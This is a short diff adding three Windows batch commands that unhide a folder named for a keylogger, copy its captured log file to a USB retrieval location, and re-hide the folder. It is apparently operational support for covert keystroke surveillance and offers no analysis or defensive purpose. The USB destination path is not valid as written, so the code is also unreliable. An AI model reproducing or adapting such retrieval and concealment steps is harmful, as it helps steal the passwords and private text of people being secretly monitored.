@@ -1,0 +1,3 @@
+attrib -h C:\\KeyLoggerFolder
+copy C:\\KeyLoggerFolder\\log.txt USB:\\KeyLoggerRetrieval\\log.txt
+attrib +h C:\\KeyLoggerFolder
